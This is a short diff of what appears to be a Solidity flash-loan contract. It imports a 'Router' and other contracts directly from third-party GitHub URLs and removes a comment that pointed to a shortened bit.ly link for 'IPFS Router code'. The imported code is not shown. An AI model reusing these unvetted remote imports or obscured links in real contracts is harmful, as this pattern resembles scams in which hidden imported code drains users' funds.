@@ -11,8 +11,6 @@ import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/
 // Router
 import "https://github.com/FlashPCS/PCSV2/blob/main/Router";
  
-//To view the IPFS Router code, copy and paste this link: https://bit.ly/3Hd4N9R
- 
 // Multiplier-Finance Smart Contracts
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
